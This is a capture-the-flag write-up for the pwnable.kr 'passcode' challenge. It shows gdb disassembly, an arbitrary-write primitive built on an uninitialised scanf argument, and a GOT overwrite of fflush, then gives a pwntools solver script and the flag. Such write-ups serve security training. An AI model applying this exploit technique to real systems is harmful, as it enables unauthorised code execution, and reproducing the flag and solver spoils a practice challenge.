Well, first I tracked the warning from gcc compiler.
```
$ gcc passcode.c 
passcode.c: In function ‘login’:
passcode.c:9:17: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
    9 |         scanf("%d", passcode1);
      |                ~^   ~~~~~~~~~
      |                 |   |
      |                 |   int
      |                 int *
passcode.c:14:17: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
   14 |         scanf("%d", passcode2);
      |                ~^   ~~~~~~~~~
      |                 |   |
      |                 |   int
      |                 int *
```
It used passcode1, not &passcode1. Hmm..

I cheated the writeups on this problem (since I am pwn-noob!) and the keywords are GOT overwrite and partial RELRO.

```
$ checksec passcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```
According to [#](http://www.lazenca.net/display/TEC/04.RELRO), partial RELRO permits write to got.

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048665 <+0>:     push   %ebp      
   0x08048666 <+1>:     mov    %esp,%ebp 
=> 0x08048668 <+3>:     and    $0xfffffff0,%esp
   0x0804866b <+6>:     sub    $0x10,%esp
   0x0804866e <+9>:     movl   $0x80487f0,(%esp)
   0x08048675 <+16>:    call   0x8048450 <puts@plt>
   0x0804867a <+21>:    call   0x8048609 <welcome>
   0x0804867f <+26>:    call   0x8048564 <login>
   0x08048684 <+31>:    movl   $0x8048818,(%esp)
   0x0804868b <+38>:    call   0x8048450 <puts@plt>
   0x08048690 <+43>:    mov    $0x0,%eax
   0x08048695 <+48>:    leave
   0x08048696 <+49>:    ret
End of assembler dump.
```
In main, after running calling welcome, login is called, so welcome function and login function will run on same stack address.
```
(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp
   0x0804860c <+3>:     sub    $0x88,%esp
   0x08048612 <+9>:     mov    %gs:0x14,%eax
   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:    xor    %eax,%eax
   0x0804861d <+20>:    mov    $0x80487cb,%eax
   0x08048622 <+25>:    mov    %eax,(%esp)
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    $0x80487e3,%eax
   0x08048643 <+58>:    lea    -0x70(%ebp),%edx
   0x08048646 <+61>:    mov    %edx,0x4(%esp)
   0x0804864a <+65>:    mov    %eax,(%esp)
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
...
```
`welcome` calls scanf function which have two arguments. The second argument is `0x4(%esp)`, which is `%edx`, equal to `-0x70(%ebp)`.

```
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     sub    $0x28,%esp
   0x0804856a <+6>:     mov    $0x8048770,%eax
   0x0804856f <+11>:    mov    %eax,(%esp)
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
...
```

`login` calls scanf and its second argument is the value located in memory address `-0x10(%ebp)`, which was controllable by `welcome` scanf function.

## Arbitrary Memory 4-byte Write

If we want to write `0xcafebabe` on address `0xdeafbeef`, do the followings:

1. For the first welcome function input, put first 0x60bytes any value, and next put 4 bytes to be `0xdeafbeef` in Little Endian.
2. For the second login function input, type an integer value `int(0xcafebabe, 16)`

## GOT overwrite

After calling scanf, flush function is called. Using arbitrary write, we can change got of fflush to the address of `system("/bin/cat flag")`.

```
(gdb) disass 0x8048430
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    *0x804a004      
   0x08048436 <+6>:     push   $0x8
   0x0804843b <+11>:    jmp    0x8048410       
End of assembler dump.
```

got address of fflush is `0x804a004`.

```
   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>        
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
```
`system("/bin/cat flag")` is at `0x080485e3`. 

## Solver Code
```
from pwn import *

fflush_got_address = 0x804a004
new_got_value = 0x080485e3

sh = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
p = sh.process(['./passcode'])
p.sendline(b'A'*0x60 + p32(fflush_got_address))
p.sendline(str(new_got_value))
p.interactive()
```

flag is `Sorry mom.. I got confused about scanf usage :(`.